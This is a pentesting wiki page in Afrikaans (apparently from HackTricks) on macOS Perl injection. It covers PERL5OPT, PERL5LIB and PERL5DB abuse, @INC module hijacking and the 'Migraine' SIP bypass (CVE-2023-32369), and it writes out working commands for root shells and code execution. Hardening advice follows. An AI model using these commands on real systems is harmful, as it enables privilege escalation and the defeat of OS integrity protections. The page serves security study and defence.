# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via `PERL5OPT` & `PERL5LIB` env variable

Deur die env variable **`PERL5OPT`** te gebruik, is dit moontlik om **Perl** arbitrêre commands te laat uitvoer wanneer die interpreter start (selfs **voordat** die eerste reël van die target script ge-parse word).
Byvoorbeeld, skep hierdie script:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Eksporteer nou die **env-veranderlike** en voer die **perl**-skrip uit:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Nog ’n opsie is om ’n Perl-module te skep (bv. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
En gebruik dan die env variables sodat die module outomaties gevind en gelaai word:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Ander interessante environment variables

- **`PERL5DB`** – wanneer die interpreter met die **`-d`** (debugger)-flag gestart word, word die inhoud van `PERL5DB` as Perl-kode *binne* die debugger-konteks uitgevoer.
As jy beide die environment en die command-line flags van ’n bevoorregte Perl-proses kan beïnvloed, kan jy iets soos die volgende doen:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

- **`PERL5SHELL`** – op Windows beheer hierdie variable watter shell executable Perl sal gebruik wanneer dit ’n shell moet spawn. Dit word hier slegs vir volledigheid genoem, aangesien dit nie relevant is op macOS nie.

Alhoewel `PERL5DB` die `-d`-switch vereis, is dit algemeen om maintenance- of installer-scripts te vind wat as *root* met hierdie flag enabled uitgevoer word vir verbose troubleshooting, wat die variable ’n geldige escalation vector maak.

## Via dependencies (@INC abuse)

Dit is moontlik om die include path te lys waarna Perl sal soek (**`@INC`**) deur die volgende uit te voer:
```bash
perl -e 'print join("\n", @INC)'
```
Tipiese uitvoer op macOS 13/14 lyk soos:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Sommige van die teruggestuurde vouers bestaan nie eens nie, maar **`/Library/Perl/5.30`** bestaan wel, word *nie* deur SIP beskerm nie en is *voor* die SIP-beskermde vouers. Daarom, as jy as *root* kan skryf, kan jy ’n kwaadwillige module (bv. `File/Basename.pm`) plaas wat *preferentially* gelaai sal word deur enige bevoorregte script wat daardie module invoer.

> [!WARNING]
> Jy benodig steeds **root** om binne `/Library/Perl` te skryf, en macOS sal ’n **TCC**-prompt wys wat vra vir *Full Disk Access* vir die proses wat die skryfbewerking uitvoer.

Byvoorbeeld, as ’n script **`use File::Basename;`** invoer, sou dit moontlik wees om `/Library/Perl/5.30/File/Basename.pm` te skep wat aanvaller-beheerde code bevat.

## SIP bypass via Migration Assistant (CVE-2023-32369 “Migraine”)

In Mei 2023 het Microsoft **CVE-2023-32369**, met die bynaam **Migraine**, bekendgemaak: ’n post-exploitation-tegniek wat ’n *root*-aanvaller toelaat om **System Integrity Protection (SIP)** volledig te **bypass**.
Die kwesbare komponent is **`systemmigrationd`**, ’n daemon met die **`com.apple.rootless.install.heritable`**-entitlement. Enige child process wat deur hierdie daemon voortgebring word, erf die entitlement en loop dus *buite* SIP-beperkings.<sup>[[1]](#references)</sup>

Een van die child processes wat deur die navorsers geïdentifiseer is, is die Apple-ondertekende interpreter:<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Omdat Perl `PERL5OPT` respekteer (en Bash `BASH_ENV` respekteer), is dit genoeg om die daemon se *environment* te vergiftig om arbitrary execution in ’n SIP-less context te verkry:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Wanneer `migrateLocalKDC` loop, begin `/usr/bin/perl` met die kwaadwillige `PERL5OPT` en voer `/private/tmp/migraine.sh` uit *voordat SIP heraktiveer word*. Vanuit daardie script kan jy byvoorbeeld ’n payload binne **`/System/Library/LaunchDaemons`** kopieer of die `com.apple.rootless` extended attribute aan ’n lêer toewys om dit **onverwyderbaar** te maak.

Apple het die probleem in macOS **Ventura 13.4**, **Monterey 12.6.6** en **Big Sur 11.7.7** reggestel, maar ouer of ongepatchte stelsels bly uitbuitbaar.<sup>[[1]](#references)</sup>

## Hardening-aanbevelings

1. **Verwyder gevaarlike veranderlikes** – bevoorregte launchdaemons of cron jobs behoort met ’n skoon omgewing te begin (`launchctl unsetenv PERL5OPT`, `env -i`, ens.).
2. **Vermy dit om interpreters as root uit te voer** tensy dit streng noodsaaklik is. Gebruik compiled binaries of verminder privileges vroeg.
3. **Verskaf scripts met `-T` (taint mode)** sodat Perl `PERL5OPT` en ander onveilige switches ignoreer wanneer taint checking geaktiveer is.
4. **Hou macOS op datum** – “Migraine” is volledig in huidige releases gepatch.

## References

- [1] [Microsoft Security Blog – New macOS vulnerability, Migraine, could bypass System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
